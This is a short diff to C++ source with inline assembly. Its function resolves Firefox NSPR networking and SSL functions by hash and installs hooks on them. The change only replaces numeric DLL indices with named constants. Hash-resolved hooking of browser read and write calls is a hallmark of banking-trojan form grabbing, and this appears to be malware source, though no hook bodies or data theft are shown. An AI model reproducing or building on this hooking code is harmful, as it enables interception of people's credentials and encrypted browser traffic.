@@ -947,28 +947,28 @@ bool NSPRHOOKS::HookNSPRApi()
 	DWORD PR_ConnectHash   = 0xBF667EA2;
 	DWORD SSL_ImportFDHash = 0xA1C4E024;
 
-	if (HookApi( 10, PR_OpenTCPSocketHash, &PR_OpenTCPSocketHook))
+	if (HookApi( DLL_NSPR4, PR_OpenTCPSocketHash, &PR_OpenTCPSocketHook))
 	{
 	   __asm mov [PR_OpenTCPSocketReal], eax
 	}
 	else
 		return false;
 
-	if ( HookApi( 10, PR_CloseHash, &PR_CloseHook ) )
+	if ( HookApi( DLL_NSPR4, PR_CloseHash, &PR_CloseHook ) )
 	{
 	   __asm mov [ PR_CloseReal ], eax
 	}
 	else
 		return false;
 
-	if ( HookApi( 10, PR_ConnectHash, &PR_ConnectHook ) )
+	if ( HookApi( DLL_NSPR4, PR_ConnectHash, &PR_ConnectHook ) )
 	{
 	   __asm mov [ PR_ConnectReal ], eax
 	}
 	else
 		return false;
 
-	if ( HookApi( 10, PR_WriteHash, &PR_WriteHook ) )
+	if ( HookApi( DLL_NSPR4, PR_WriteHash, &PR_WriteHook ) )
 	{
 		__asm mov [ PR_WriteReal], eax
 	}
@@ -976,7 +976,7 @@ bool NSPRHOOKS::HookNSPRApi()
 		return false;
 
 
-	if ( HookApi( 10, PR_ReadHash, &PR_ReadHook ) )
+	if ( HookApi( DLL_NSPR4, PR_ReadHash, &PR_ReadHook ) )
 	{
 		__asm mov [ PR_ReadReal ], eax
 	}
@@ -989,7 +989,7 @@ bool NSPRHOOKS::HookNSPRApi()
 	#endif
 
 
-//	if ( HookApi( 11, SSL_ImportFDHash, (DWORD)&SSL_ImportFDHook ) )
+//	if ( HookApi( DLL_SSL3, SSL_ImportFDHash, (DWORD)&SSL_ImportFDHook ) )
 //	{
 //	   __asm mov [ SSL_ImportFDReal ], eax
 //	}
